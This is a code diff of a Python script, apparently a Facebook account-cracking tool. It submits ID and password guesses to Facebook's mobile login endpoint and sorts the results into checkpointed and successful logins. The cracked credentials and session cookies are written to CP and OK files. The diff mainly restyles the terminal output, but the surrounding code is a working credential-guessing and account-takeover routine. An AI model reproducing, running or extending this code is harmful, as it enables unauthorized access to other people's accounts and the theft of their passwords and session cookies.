@@ -1541,41 +1541,44 @@ def reguler(idf,pwv):
             po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
             if "checkpoint" in ses.cookies.get_dict().keys():
 		    if 'no' in gabriel:
-			    print('\n')
-			    print(f'{K}Akun checkpoint\n[•] ID       : {idf}\n[•] TAHUN   : {cektahun(idf)}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} ')
+			    cp+=1
+			    tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+			    tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+			    prints(tree)
 			    os.popen('play-audio c.mp3')
 			    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			    akun.append(idf+'|'+pw)
-			    cp+=1
 			    break
 		    elif 'ya' in gabriel:
 			    cp+=1
-			    print('\n')
-			    statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-			    statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
-			    cetak(statuscp1)
+			    tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+			    tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+			    prints(tree)
 			    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			    os.popen('play-audio c.mp3')
 			    akun.append(idf+'|'+pw)
 			    ceker(idf,pw)
 			    break
             elif "c_user" in ses.cookies.get_dict().keys():
 		    if 'no' in taplikasi:
 			    ok+=1
-			    print('\n')
 			    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-			    print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN   : {cektahun(idf)}\n[•] COOKIES  : {kuki}')
+			    tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+			    tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+			    tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
+			    prints(tree)
 			    os.popen('play-audio o.mp3')
 			    open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 			    break
 		    elif 'ya' in taplikasi:
 			    ok+=1
-			    coki=po.cookies.get_dict()
 			    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-			    print('\n')
-			    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-			    statusok1 = nel(statusok, width=90, style='bold green', title='OK')
-			    cetak(statusok1)
-			    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+			    tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+			    tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+			    tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
+			    prints(tree)
+			    os.popen('play-audio o.mp3')
+			    open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 			    cek_apk(kuki)
 			    break
             else:continue
